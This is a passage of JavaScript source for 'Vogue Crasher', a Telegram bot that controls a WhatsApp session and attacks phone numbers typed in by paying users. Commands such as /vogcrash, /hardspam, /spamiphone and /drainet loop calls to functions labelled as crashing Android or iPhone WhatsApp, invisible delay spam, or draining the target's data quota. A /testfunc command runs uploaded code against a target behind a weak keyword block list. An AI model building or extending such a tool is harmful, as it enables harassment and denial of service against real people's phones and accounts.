        async () => {

            try {

                await ctx.telegram
                .editMessageText(
                    ctx.chat.id,
                    msg.message_id,
                    undefined,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 SYSTEM RESTART 〕

Restart Operation
Completed Successfully

━━━━━━━━━━━━━━━━━━━━━━

◈ Runtime  : Restored
◈ Engine   : Online
◈ Session  : Active

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ONLINE & STABLE
\`\`\``,

{
    parse_mode:
        "markdown"
}
                );

            } catch {}

            process.exit(1);

        },

        3000
    );
});

bot.command('killsession', async (ctx) => {

    if (ctx.from.id != ownerID) {

        return ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

Access Denied

This command is restricted
to the system owner.
\`\`\``
        );
    }

    const msg =
        await ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 SESSION CONTROL 〕

◈ Removing Auth Files
◈ Disconnecting Session
◈ Cleaning Runtime Data

━━━━━━━━━━━━━━━━━━━━━━

System Status :
PROCESSING
\`\`\``,

{
    parse_mode:
        "markdown"
}
    );

    try {

        if (sock) {

            try {

                await sock.logout();

            } catch {}
        }

        const sessionPath =
            "./session";

        if (
            fs.existsSync(
                sessionPath
            )
        ) {

            fs.rmSync(
                sessionPath,
                {
                    recursive:
                        true,

                    force:
                        true
                }
            );
        }

        isWhatsAppConnected =
            false;

        await ctx.telegram
        .editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 SESSION CONTROL 〕

Session Successfully
Destroyed

━━━━━━━━━━━━━━━━━━━━━━

◈ Auth Files : Removed
◈ Runtime    : Cleared
◈ Connection : Offline

━━━━━━━━━━━━━━━━━━━━━━

Re-pairing is required
before reconnecting.

━━━━━━━━━━━━━━━━━━━━━━

System Status :
SESSION TERMINATED
\`\`\``,

{
    parse_mode:
        "markdown"
}
        );

        console.log(
            `[VOGUE CRASHER] Session terminated successfully`
        );

    } catch (error) {

        await ctx.telegram
        .editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 SESSION CONTROL 〕

Session Removal Failed

━━━━━━━━━━━━━━━━━━━━━━

◈ Engine  : Error
◈ Action  : Aborted
◈ Status  : Failed

━━━━━━━━━━━━━━━━━━━━━━

Unable to remove the
current session data.

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ERROR DETECTED
\`\`\``,

{
    parse_mode:
        "markdown"
}
        );

        console.log(
            `[VOGUE CRASHER] Session termination failed`
        );
    }
});

bot.command("info", async (ctx) => {

    const totalRam =
        (
            os.totalmem() /
            1024 / 1024 / 1024
        ).toFixed(2);

    const freeRam =
        (
            os.freemem() /
            1024 / 1024 / 1024
        ).toFixed(2);

    const usedRam =
        (
            totalRam - freeRam
        ).toFixed(2);

    const uptime =
        process.uptime();

    const days =
        Math.floor(
            uptime / 86400
        );

    const hours =
        Math.floor(
            (uptime % 86400) /
            3600
        );

    const minutes =
        Math.floor(
            (uptime % 3600) /
            60
        );

    const seconds =
        Math.floor(
            uptime % 60
        );

    const runtime =
        `${days}d ${hours}h ${minutes}m ${seconds}s`;

    const cpuModel =
        os.cpus()[0].model;

    const cpuCores =
        os.cpus().length;

    const cpuArch =
        os.arch();

    const cpuLoad =
        os.loadavg()[0]
        .toFixed(2);

    const platform =
        os.platform();

    const hostname =
        os.hostname();

    const senderStatus =
        isWhatsAppConnected
        ? "CONNECTED"
        : "DISCONNECTED";

    const currentTime =
        moment()
        .tz("Asia/Jakarta")
        .format(
            "DD/MM/YYYY HH:mm:ss"
        );

    const pages = [

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 SYSTEM INFO 〕

◈ Bot Name  : Vogue Crasher
◈ Version   : 1.8 Stable
◈ Developer : @PrinceXVogue
◈ Runtime   : ${runtime}

━━━━━━━━━━━━━━━━━━━━━━

◈ PID       : ${process.pid}
◈ NodeJS    : ${process.version}
◈ Status    : ACTIVE

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ONLINE & STABLE
\`\`\``,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 CONNECTION INFO 〕

◈ Sender    : ${senderStatus}
◈ Mode      : SINGLE DEVICE
◈ Platform  : TELEGRAM BRIDGE

━━━━━━━━━━━━━━━━━━━━━━

◈ Time      : ${currentTime}
◈ Service   : STABLE
◈ Runtime   : ACTIVE

━━━━━━━━━━━━━━━━━━━━━━

System Status :
CONNECTED
\`\`\``,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 VPS INFO 〕

◈ Hostname  : ${hostname}
◈ Platform  : ${platform}
◈ Arch      : ${cpuArch}

━━━━━━━━━━━━━━━━━━━━━━

◈ CPU Model :
${cpuModel}

━━━━━━━━━━━━━━━━━━━━━━

◈ CPU Core  : ${cpuCores}
◈ CPU Load  : ${cpuLoad}

━━━━━━━━━━━━━━━━━━━━━━

System Status :
SERVER ACTIVE
\`\`\``,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 MEMORY INFO 〕

◈ Total RAM : ${totalRam} GB
◈ Used RAM  : ${usedRam} GB
◈ Free RAM  : ${freeRam} GB

━━━━━━━━━━━━━━━━━━━━━━

◈ Usage :
${(
(
usedRam / totalRam
) * 100
).toFixed(1)}%

━━━━━━━━━━━━━━━━━━━━━━

System Status :
MEMORY STABLE
\`\`\``

    ];

    let currentPage = 0;

    const keyboard = (
        page
    ) => ({

        inline_keyboard: [[

        {
            text:
                "◀",
            callback_data:
                `info_back_${page}`
        },

        {
            text:
                `${page + 1}/${pages.length}`,
            callback_data:
                "info_page"
        },

        {
            text:
                "▶",
            callback_data:
                `info_next_${page}`
        }

        ]]
    });

    await ctx.replyWithPhoto(
        thumbnailUrl,

        {
            caption:
                pages[currentPage],

            parse_mode:
                "markdown",

            reply_markup:
                keyboard(currentPage)
        }
    );
});

bot.on("callback_query", async (ctx) => {

    const data =
        ctx.callbackQuery.data;

    if (
        !data.startsWith(
            "info_"
        )
    ) return;

    const totalPages = 4;

    let page =
        parseInt(
            data.split("_")[2]
        );

    if (
        data.startsWith(
            "info_next"
        )
    ) {

        page =
            (page + 1) %
            totalPages;
    }

    if (
        data.startsWith(
            "info_back"
        )
    ) {

        page =
            (
                page - 1 +
                totalPages
            ) %
            totalPages;
    }

    const os =
        require("os");

    const moment =
        require(
            "moment-timezone"
        );

    const totalRam =
        (
            os.totalmem() /
            1024 / 1024 / 1024
        ).toFixed(2);

    const freeRam =
        (
            os.freemem() /
            1024 / 1024 / 1024
        ).toFixed(2);

    const usedRam =
        (
            totalRam - freeRam
        ).toFixed(2);

    const uptime =
        process.uptime();

    const days =
        Math.floor(
            uptime / 86400
        );

    const hours =
        Math.floor(
            (uptime % 86400) /
            3600
        );

    const minutes =
        Math.floor(
            (uptime % 3600) /
            60
        );

    const seconds =
        Math.floor(
            uptime % 60
        );

    const runtime =
        `${days}d ${hours}h ${minutes}m ${seconds}s`;

    const cpuModel =
        os.cpus()[0].model;

    const cpuCores =
        os.cpus().length;

    const cpuArch =
        os.arch();

    const cpuLoad =
        os.loadavg()[0]
        .toFixed(2);

    const platform =
        os.platform();

    const hostname =
        os.hostname();

    const senderStatus =
        isWhatsAppConnected
        ? "CONNECTED"
        : "DISCONNECTED";

    const currentTime =
        moment()
        .tz("Asia/Jakarta")
        .format(
            "DD/MM/YYYY HH:mm:ss"
        );

    const pages = [

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 SYSTEM INFO 〕

◈ Bot Name  : Vogue Crasher
◈ Version   : 1.8 Stable
◈ Developer : @PrinceXVogue
◈ Runtime   : ${runtime}

━━━━━━━━━━━━━━━━━━━━━━

◈ PID       : ${process.pid}
◈ NodeJS    : ${process.version}
◈ Status    : ACTIVE

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ONLINE & STABLE
\`\`\``,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 CONNECTION INFO 〕

◈ Sender    : ${senderStatus}
◈ Mode      : SINGLE DEVICE
◈ Platform  : TELEGRAM BRIDGE

━━━━━━━━━━━━━━━━━━━━━━

◈ Time      : ${currentTime}
◈ Service   : STABLE
◈ Runtime   : ACTIVE

━━━━━━━━━━━━━━━━━━━━━━

System Status :
CONNECTED
\`\`\``,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 VPS INFO 〕

◈ Hostname  : ${hostname}
◈ Platform  : ${platform}
◈ Arch      : ${cpuArch}

━━━━━━━━━━━━━━━━━━━━━━

◈ CPU Model :
${cpuModel}

━━━━━━━━━━━━━━━━━━━━━━

◈ CPU Core  : ${cpuCores}
◈ CPU Load  : ${cpuLoad}

━━━━━━━━━━━━━━━━━━━━━━

System Status :
SERVER ACTIVE
\`\`\``,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 MEMORY INFO 〕

◈ Total RAM : ${totalRam} GB
◈ Used RAM  : ${usedRam} GB
◈ Free RAM  : ${freeRam} GB

━━━━━━━━━━━━━━━━━━━━━━

◈ Usage :
${(
(
usedRam / totalRam
) * 100
).toFixed(1)}%

━━━━━━━━━━━━━━━━━━━━━━

System Status :
MEMORY STABLE
\`\`\``

    ];

    const keyboard = {

        inline_keyboard: [[

        {
            text:
                "◀",
            callback_data:
                `info_back_${page}`
        },

        {
            text:
                `${page + 1}/${pages.length}`,
            callback_data:
                "info_page"
        },

        {
            text:
                "▶",
            callback_data:
                `info_next_${page}`
        }

        ]]
    };

    try {

        await ctx.editMessageCaption(
            pages[page],

            {
                parse_mode:
                    "markdown",

                reply_markup:
                    keyboard
            }
        );

        await ctx.answerCbQuery();

    } catch (e) {}
});

bot.command('ping', async (ctx) => {

    const start =
        Date.now();

    const msg =
        await ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 NETWORK SCAN 〕

◈ Host      : Telegram API
◈ Engine    : Latency Analyzer
◈ Status    : Scanning

━━━━━━━━━━━━━━━━━━━━━━

Analyzing network
response speed...

━━━━━━━━━━━━━━━━━━━━━━

System Status :
PROCESSING
\`\`\``,

{
    parse_mode:
        "markdown"
}
    );

    setTimeout(
        async () => {

            const ping =
                Date.now() -
                start;

            await ctx.telegram
            .editMessageText(
                ctx.chat.id,
                msg.message_id,
                undefined,

`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 NETWORK SCAN 〕

◈ Response  : ${ping} ms
◈ Connection: Stable
◈ Status    : Completed

━━━━━━━━━━━━━━━━━━━━━━

Latency analysis
finished successfully.

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ONLINE & STABLE
\`\`\``,

{
    parse_mode:
        "markdown"
}
            );

        },

        2000
    );
});

bot.command("testfunc", checkWhatsAppConnection, async (ctx) => {

    try {

        const args =
            ctx.message.text.split(" ");

        const targetInput =
            args[1];

        const loop =
            parseInt(args[2]) || 1;

        if (!targetInput) {

            return ctx.reply(
`Format Salah

/testfunc 628xxx 5`
            );
        }

        if (
            !ctx.message.reply_to_message?.document
        ) {

            return ctx.reply(
`Upload file .js lalu reply menggunakan command

Format:
/testfunc 628xxx 5`
            );
        }

        const file =
            ctx.message.reply_to_message.document;

        const fileName =
            file.file_name || "";

        if (
            !fileName.endsWith(".js")
        ) {

            return ctx.reply(
                "File harus format .js"
            );
        }

        const fileLink =
            await ctx.telegram.getFileLink(
                file.file_id
            );

        const response =
            await axios.get(
                fileLink.href
            );

        let code =
            response.data;

        if (!code) {

            return ctx.reply(
                "Code tidak ditemukan"
            );
        }

        code =
            code
            .replace(/\r/g, "")
            .replace(/\u200B/g, "")
            .replace(/\uFEFF/g, "")
            .trim();

        const blocked = [
            "require(",
            "process.",
            "child_process",
            "exec(",
            "spawn(",
            "fork(",
            "eval(",
            "import ",
            "while(true)",
            "for(;;)"
        ];

        for (const bad of blocked) {

            if (
                code
                .toLowerCase()
                .includes(
                    bad.toLowerCase()
                )
            ) {

                return ctx.reply(
`Blocked syntax detected

${bad}`
                );
            }
        }

        const match =
            code.match(
                /async\s+function\s+([a-zA-Z0-9_]+)\s*\(/
            );

        if (!match) {

            return ctx.reply(
                "Async function tidak ditemukan"
            );
        }

        const funcName =
            match[1];

        const target =
            targetInput.replace(
                /[^0-9]/g,
                ""
            ) +
            "@s.whatsapp.net";

        const context = {

            sock,
            target,

            axios,
            moment,
            crypto,
            fs,
            path,
            chalk,
            proto,
            jid,
            os,
            vm,

            generateWAMessage,
            generateWAMessageFromContent,
            prepareWAMessageMedia,
            generateWAMessageContent,
            downloadContentFromMessage,
            makeInMemoryStore,
            getContentType,
            DisconnectReason,
            useMultiFileAuthState,
            fetchLatestBaileysVersion,
            makeCacheableSignalKeyStore,

            sleep,
            bot,

            Buffer,
            BufferJSON,
            EventEmitter
        };

        const AsyncFunction =
            Object.getPrototypeOf(
                async function() {}
            ).constructor;

        let runner;

        try {

            const params =
                Object.keys(context);

            runner =
                new AsyncFunction(
                    ...params,
`
${code}

return await ${funcName}(sock, target)
`
                );

        } catch (e) {

            return ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 FUNCTION ERROR 〕

Compiler execution failed.

━━━━━━━━━━━━━━━━━━━━━━

◈ Error :
${e.message}

━━━━━━━━━━━━━━━━━━━━━━

System Status :
EXECUTION FAILED
\`\`\``,

            {
                parse_mode:
                    "Markdown"
            });
        }

        await ctx.reply(
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 TEST FUNCTION 〕

◈ Function : ${funcName}
◈ Target   : ${targetInput}
◈ Loop     : ${loop}

━━━━━━━━━━━━━━━━━━━━━━

Function execution
has been initialized.

━━━━━━━━━━━━━━━━━━━━━━

System Status :
RUNNING
\`\`\``,

            {
                parse_mode:
                    "Markdown"
            });

        const instanceId =
            Date.now() +
            Math.random();

        (async () => {

            for (
                let i = 0;
                i < loop;
                i++
            ) {

                try {

                    await runner(
                        ...Object.values(
                            context
                        )
                    );
                    
                    await sleep(1500)

                    console.log(
`[TESTFUNC ${instanceId}] Loop ${i + 1}/${loop}`
                    );

                } catch (e) {

                    console.log(
`[TESTFUNC ERROR] ${e.stack || e.message}`
                    );

                    break;
                }
            }

            console.log(
`[TESTFUNC ${instanceId}] Finished`
            );

        })();

    } catch (err) {

        return ctx.reply(
`\`\`\`ruby
TESTFUNC FAILURE

${err.stack || err.message}
\`\`\``,
{
    parse_mode: "Markdown"
}
        );
    }
});


//                                                    
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//

setInterval(async () => {
    currentStyleIndex =
        (currentStyleIndex + 1) % styleCycle.length;

    const style = styleCycle[currentStyleIndex];

    for (const [chatId, data] of activeButtons.entries()) {
        try {
            await bot.telegram.editMessageReplyMarkup(
                chatId,
                data.msgId,
                undefined,
                {
                    inline_keyboard: [[
                        {
                            text: `Check Target`,
                            url: `https://wa.me/${data.clean}`,
                            style: style // hanya jika wrapper kamu support
                        }
                    ]]
                }
            );

        } catch (e) {
            activeButtons.delete(chatId);
        }
    }

}, 2500);

bot.command('drainet', checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
        let q =
            ctx.message?.text
            ?.split(" ")[1];

        if (!q) {

            return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 INVALID FORMAT 〕

Usage :
/drainet 628xxxxxxx

━━━━━━━━━━━━━━━━━━━━━━

Example :
/drainet 628123456789

━━━━━━━━━━━━━━━━━━━━━━

System Status :
WAITING INPUT
`
            );
        }

        let target =
            q.replace(
                /[^0-9]/g,
                ""
            ) +
            "@s.whatsapp.net";

        try {

            const sent =
                await ctx.replyWithPhoto(
                    thumbnailUrl,

                    {
                        caption:
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION STATUS 〕

◈ Target :
${q}

◈ Action :
Increase Quota Usage

━━━━━━━━━━━━━━━━━━━━━━

Execution completed successfully.

━━━━━━━━━━━━━━━━━━━━━━

System Status :
SUCCESS
\`\`\``,

                        parse_mode:
                            "markdown",

                        reply_markup: {

                            inline_keyboard: [[

                            {
                                text:
                                    "Check Target",

                                url:
                                    `https://wa.me/${q}`
                            }

                            ]]
                        }
                    }
                );
                
                activeButtons.set(ctx.chat.id, {
                    msgId: sent.message_id,
                    clean
                });

            (
                async () => {

                    const instanceId =
                        Date.now() +
                        Math.random();

                    for (
                        let i = 0;
                        i < 1;
                        i++
                    ) {

                        try {

                            await VogueBuldo(
                                sock,
                                target
                            );

                            await sleep(
                                1500
                            );

                        } catch (e) {

                            console.log(
`[WORKER ${instanceId}] Error : ${e.message}`
                            );
                        }
                    }

                    console.log(
`[WORKER ${instanceId}] Completed : ${q}`
                    );

                }
            )();

        } catch (error) {

            ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION FAILED 〕

The system failed to
execute the request.

━━━━━━━━━━━━━━━━━━━━━━

Please verify :
◈ Target Number
◈ System Status
◈ Connection State

━━━━━━━━━━━━━━━━━━━━━━

System Status :
FAILED
`
            );

            console.log(
`[VOGUE CRASHER] Execution failed for ${q}`
            );
        }
    });

bot.command('hardspam', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {

        let q =
            ctx.message?.text
            ?.split(" ")[1];

        if (!q) {

            return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 INVALID FORMAT 〕

Usage :
/hardspam 628xxxxxxx

━━━━━━━━━━━━━━━━━━━━━━

Example :
/hardspam 628123456789

━━━━━━━━━━━━━━━━━━━━━━

System Status :
WAITING INPUT
`
            );
        }

        let clean =
            q.replace(
                /[^0-9]/g,
                ""
            );

        let target =
            clean +
            "@s.whatsapp.net";

        try {

            const sent = await ctx.replyWithPhoto(
                thumbnailUrl,

                {
                    caption:
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION STATUS 〕

◈ Target :
${clean}

◈ Action :
Android Delay Hard Spam Invisible

━━━━━━━━━━━━━━━━━━━━━━

System Status :
SUCCESS
\`\`\``,

                    parse_mode:
                        "Markdown",

                    reply_markup: {

                        inline_keyboard: [[
                        {
                            text:
                                "Check Target",

                            url:
`https://wa.me/${clean}`
                        }
                        ]]
                    }
                }
            );
            
            activeButtons.set(ctx.chat.id, {
                msgId: sent.message_id,
                clean
            });

            (async () => {

                const instanceId =
                    Date.now() +
                    Math.random();

                for (let i = 0; i < 10; i++) {

                    try {

                        await VogueSpamInvis(sock, target);
                        await sleep(3000);

                    } catch (e) {

                        console.log(
`[WORKER ${instanceId}] Error: ${e.message}`
                        );

                        await restartBot(
                            "Connection Closed"
                        );
                    }
                }

                console.log(
`[WORKER ${instanceId}] Done for ${clean}`
                );

            })();

        } catch (error) {

            ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION FAILED 〕

The system failed to
execute the request.

━━━━━━━━━━━━━━━━━━━━━━

Please verify :
◈ Target Input
◈ Connection State
◈ Module Engine

━━━━━━━━━━━━━━━━━━━━━━

System Status :
FAILED
`
            );

            console.log(
`[VOGUE CRASHER] ${error.message}`
            );

            await restartBot(
                "Connection Closed"
            );
        }
});

bot.command('voguehard', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {

        let q =
            ctx.message?.text
            ?.split(" ")[1];

        if (!q) {

            return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 INVALID FORMAT 〕

Usage :
/voguehard 628xxxxxxx

━━━━━━━━━━━━━━━━━━━━━━

Example :
/voguehard 628123456789

━━━━━━━━━━━━━━━━━━━━━━

System Status :
WAITING INPUT
`
            );
        }

        let clean =
            q.replace(
                /[^0-9]/g,
                ""
            );

        let target =
            clean +
            "@s.whatsapp.net";

        try {

            const sent = await ctx.replyWithPhoto(
                thumbnailUrl,

                {
                    caption:
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION STATUS 〕

◈ Target :
${clean}

◈ Action :
Android Delay Hard Invisible

━━━━━━━━━━━━━━━━━━━━━━

System Status :
SUCCESS
\`\`\``,

                    parse_mode:
                        "Markdown",

                    reply_markup: {

                        inline_keyboard: [[
                        {
                            text:
                                "Check Target",

                            url:
`https://wa.me/${clean}`
                        }
                        ]]
                    }
                }
            );
            
            activeButtons.set(ctx.chat.id, {
                msgId: sent.message_id,
                clean
            });

            (async () => {

                const instanceId =
                    Date.now() +
                    Math.random();

                for (let i = 0; i < 10; i++) {

                    try {

                        await VogueSpamInvis(sock, target);
                        await sleep(3000);

                    } catch (e) {

                        console.log(
`[WORKER ${instanceId}] Error: ${e.message}`
                        );

                        await restartBot(
                            "Connection Closed"
                        );
                    }
                }

                console.log(
`[WORKER ${instanceId}] Done for ${clean}`
                );

            })();

        } catch (error) {

            ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION FAILED 〕

The system failed to
execute the request.

━━━━━━━━━━━━━━━━━━━━━━

Please verify :
◈ Target Input
◈ Connection State
◈ Module Engine

━━━━━━━━━━━━━━━━━━━━━━

System Status :
FAILED
`
            );

            console.log(
`[VOGUE CRASHER] ${error.message}`
            );

            await restartBot(
                "Connection Closed"
            );
        }
});

bot.command('vogcrash', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {

        let q =
            ctx.message?.text
            ?.split(" ")[1];

        if (!q) {

            return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 INVALID FORMAT 〕

Usage :
/vogcrash 628xxxxxxx

━━━━━━━━━━━━━━━━━━━━━━

Example :
/vogcrash 628123456789

━━━━━━━━━━━━━━━━━━━━━━

System Status :
WAITING INPUT
`
            );
        }

        let clean =
            q.replace(
                /[^0-9]/g,
                ""
            );

        let target =
            clean +
            "@s.whatsapp.net";

        try {

            const sent = await ctx.replyWithPhoto(
                thumbnailUrl,

                {
                    caption:
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION STATUS 〕

◈ Target :
${clean}

◈ Action :
Android Crash Invisible

━━━━━━━━━━━━━━━━━━━━━━

System Status :
SUCCESS
\`\`\``,

                    parse_mode:
                        "Markdown",

                    reply_markup: {

                        inline_keyboard: [[
                        {
                            text: "Check Target",
                            url: `https://wa.me/${clean}`,
                            style: "success"

                        }
                        ]]
                    }
                }
            );
            
            activeButtons.set(ctx.chat.id, {
                msgId: sent.message_id,
                clean
            });

            (async () => {

                const instanceId =
                    Date.now() +
                    Math.random();

                for (let i = 0; i < 6; i++) {

                    try {
                        
                        await VogueInvisCrash(sock, target)
                        await sleep(1500);

                    } catch (e) {

                        console.log(
`[WORKER ${instanceId}] Error: ${e.message}`
                        );

                        await restartBot(
                            "Connection Closed"
                        );
                    }
                }

                console.log(
`[WORKER ${instanceId}] Done for ${clean}`
                );

            })();

        } catch (error) {

            ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION FAILED 〕

The system failed to
execute the request.

━━━━━━━━━━━━━━━━━━━━━━

Please verify :
◈ Target Input
◈ Connection State
◈ Module Engine

━━━━━━━━━━━━━━━━━━━━━━

System Status :
FAILED
`
            );

            console.log(
`[VOGUE CRASHER] ${error.message}`
            );

            await restartBot(
                "Connection Closed"
            );
        }
});

bot.command('spamandro', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {

        let q =
            ctx.message?.text
            ?.split(" ")[1];

        if (!q) {

            return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 INVALID FORMAT 〕

Usage :
/spamandro 628xxxxxxx

━━━━━━━━━━━━━━━━━━━━━━

Example :
/spamandro 628123456789

━━━━━━━━━━━━━━━━━━━━━━

System Status :
WAITING INPUT
`
            );
        }

        let clean =
            q.replace(
                /[^0-9]/g,
                ""
            );

        let target =
            clean +
            "@s.whatsapp.net";

        try {

            const sent = await ctx.replyWithPhoto(
                thumbnailUrl,

                {
                    caption:
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION STATUS 〕

◈ Target :
${clean}

◈ Action :
Android Delay Invisible

━━━━━━━━━━━━━━━━━━━━━━

System Status :
SUCCESS
\`\`\``,

                    parse_mode:
                        "Markdown",

                    reply_markup: {

                        inline_keyboard: [[
                        {
                            text:
                                "Check Target",

                            url:
`https://wa.me/${clean}`
                        }
                        ]]
                    }
                }
            );
            
            activeButtons.set(ctx.chat.id, {
                msgId: sent.message_id,
                clean
            });

            (async () => {

                const instanceId =
                    Date.now() +
                    Math.random();

                for (let i = 0; i < 1; i++) {

                    try {

                        await VogueSpamInvis(
                            sock,
                            target
                        );

                        await sleep(1500);

                    } catch (e) {

                        console.log(
`[WORKER ${instanceId}] Error: ${e.message}`
                        );

                        await restartBot(
                            "Connection Closed"
                        );
                    }
                }

                console.log(
`[WORKER ${instanceId}] Done for ${clean}`
                );

            })();

        } catch (error) {

            ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION FAILED 〕

The system failed to
execute the request.

━━━━━━━━━━━━━━━━━━━━━━

Please verify :
◈ Target Input
◈ Connection State
◈ Module Engine

━━━━━━━━━━━━━━━━━━━━━━

System Status :
FAILED
`
            );

            console.log(
`[VOGUE CRASHER] ${error.message}`
            );

            await restartBot(
                "Connection Closed"
            );
        }
});

bot.command('spamiphone', checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {

        let q =
            ctx.message?.text
            ?.split(" ")[1];

        if (!q) {

            return ctx.reply(
`
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 INVALID FORMAT 〕

Usage :
/spamiphone 628xxxxxxx

━━━━━━━━━━━━━━━━━━━━━━

Example :
/spamiphone 628123456789

━━━━━━━━━━━━━━━━━━━━━━

System Status :
WAITING INPUT
`
            );
        }

        let clean =
            q.replace(
                /[^0-9]/g,
                ""
            );

        let target =
            clean +
            "@s.whatsapp.net";

        try {

            sent = await ctx.replyWithPhoto(
                thumbnailUrl,

                {
                    caption:
`\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

〔 EXECUTION STATUS 〕

◈ Target :
${clean}

◈ Action :
Iphone Force Close

━━━━━━━━━━━━━━━━━━━━━━

System Status :
SUCCESS
\`\`\``,

                    parse_mode:
                        "Markdown",
                    reply_markup: {
                        inline_keyboard: [[
                        {
                            text:
                                "Check Target",
                            url:
`https://wa.me/${clean}`
                        }
                        ]]
                    }
                }
            );
            
            activeButtons.set(ctx.chat.id, {
                msgId: sent.message_id,
                clean
            });

            (async () => {

                const instanceId =
                    Date.now() +
                    Math.random();

                for (let i = 0; i < 5; i++) {

                    try {

                        await Ipongforcloseivs(sock, target);
                        await sleep(1500);

                    } catch (e) {

                        console.log(
`[WORKER ${instanceId}] Error: ${e.message}`
                        );

                        await restartBot(
                            "Connection Closed"
